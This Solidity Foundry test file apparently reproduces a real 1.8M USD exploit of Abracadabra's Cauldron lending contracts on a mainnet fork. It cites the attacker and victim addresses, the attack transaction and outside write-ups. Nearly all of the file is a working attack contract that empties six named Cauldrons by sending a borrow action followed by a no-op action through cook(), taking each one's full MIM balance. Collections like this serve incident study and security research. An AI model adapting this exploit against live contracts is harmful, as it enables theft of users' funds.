// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1.8M USD
// Attacker : https://etherscan.io/address/0x1aaade3e9062d124b7deb0ed6ddc7055efa7354d
// Attack Contract : https://etherscan.io/address/0xb8e0a4758df2954063ca4ba3d094f2d6eda9b993
// Vulnerable Contract : https://etherscan.io/address/0x5e70f7acb8ec0231c00220d11c74dc2b23187103
// Attack Tx : https://etherscan.io/tx/0x842aae91c89a9e5043e64af34f53dc66daf0f033ad8afbf35ef0c93f99a9e5e6

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x5e70f7acb8ec0231c00220d11c74dc2b23187103#code

// @Analysis
// https://x.com/MIM_Spell/status/1975130787486831018
// https://x.com/officer_secret/status/1974469956189512171
// https://www.quillaudits.com/blog/hack-analysis/abracadabra-hack-explained

interface IDegenBox {
    function balanceOf(IERC20 token, address user) external view returns (uint256);
    function toAmount(IERC20 token, uint256 share, bool roundUp) external view returns (uint256);
}

interface ICauldronV4 {
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);

    function magicInternetMoney() external view returns (IERC20);
    function bentoBox() external view returns (IDegenBox);
}


contract ContractTest is Test {
    uint256 constant BLOCK = 23504546 - 1;
    IDegenBox constant DEGENBOX = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
    address[6] public CAULDRONS = [
        0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c,
        0x289424aDD4A1A503870EB475FD8bF1D586b134ED,
        0xce450a23378859fB5157F4C4cCCAf48faA30865B,
        0x40d95C4b34127CF43438a963e7C066156C5b87a3,
        0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2,
        0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d
    ];
    address public constant MIM_ADDRESS = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;

    AttackContract attacker;

    function setUp() public {
        vm.createSelectFork("mainnet", BLOCK);
        attacker = new AttackContract(DEGENBOX, CAULDRONS, IERC20(MIM_ADDRESS));
        vm.label(address(attacker), "Receiver");
        vm.label(address(DEGENBOX), "Abracadabra.Money: Degenbox");
    }
    
    function testExploit() public {
        console.log("attacke contract mim balance before exploit: ", IDegenBox(DEGENBOX).balanceOf(IERC20(MIM_ADDRESS), address(attacker)));
        attacker.attack();
        console.log("attacke contract mim balance after exploit: ", IDegenBox(DEGENBOX).balanceOf(IERC20(MIM_ADDRESS), address(attacker)));
    }
}

contract AttackContract {
    IDegenBox public immutable degenBox;
    address[6] public cauldrons;
    IERC20 public immutable mim;

    uint8 internal constant ACTION_DEFAULT = 0;
    uint8 internal constant ACTION_BORROW = 5;

    constructor(IDegenBox _degenBox, address[6] memory _cauldrons, IERC20 _mim) {
        degenBox = _degenBox;
        cauldrons = _cauldrons;
        mim = _mim;
    }

    function attack() external {
        for (uint256 i = 0; i < cauldrons.length; ++i) {
            if (cauldrons[i] == address(0)) continue; // skip placeholders
            _drainCauldron(ICauldronV4(cauldrons[i]));
        }
    }

    function _drainCauldron(ICauldronV4 cauldron) internal {
        IERC20 mim = cauldron.magicInternetMoney();

        uint256 share = degenBox.balanceOf(mim, address(cauldron));
        uint256 amount = degenBox.toAmount(mim, share, false);
        
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_BORROW;
        actions[1] = ACTION_DEFAULT;
        values[0] = 0;
        values[1] = 0;
        datas[0] = abi.encode(int256(amount), address(this));
        datas[1] = bytes("");

        cauldron.cook(actions, values, datas);
    }
}

